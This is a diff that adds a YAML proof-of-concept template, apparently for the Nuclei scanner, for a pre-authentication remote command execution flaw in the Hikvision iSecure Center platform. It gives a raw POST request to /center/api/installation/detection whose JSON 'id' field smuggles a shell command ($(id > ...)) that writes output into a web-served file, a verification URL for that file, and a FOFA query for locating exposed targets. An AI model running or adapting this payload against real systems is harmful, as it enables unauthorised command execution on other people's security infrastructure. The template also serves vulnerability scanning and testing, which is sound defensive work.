@@ -1,0 +1,42 @@
+id: poc-cgcuyl5d7vd0y43t
+info:
+  name: 海康威视综合安防管理平台 detection 前台RCE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cgcuyl5d7vd0y43t'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: cgcuyl5d7vd0y43t
+    fofa: app="HIKVISION-iSecure-Center"
+http:
+- raw:
+  - 'POST /center/api/installation/detection HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36(KHTML, like Gecko) Chrome/105.0.1249.139 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Connection: close
+
+    Content-Type: application/json;charset=UTF-8
+
+    {"type":"environment","operate":"","machines":{"id":  "$(id > /opt/hikvision/web/components/tomcat85linux64.1/webapps/vms/static/1.txt)"}}
+
+
+    验证url
+
+    /vms/static/1.txt
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1722244161590-a44fc5bf-e75b-4b88-9ea9-0e49d40b585e.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
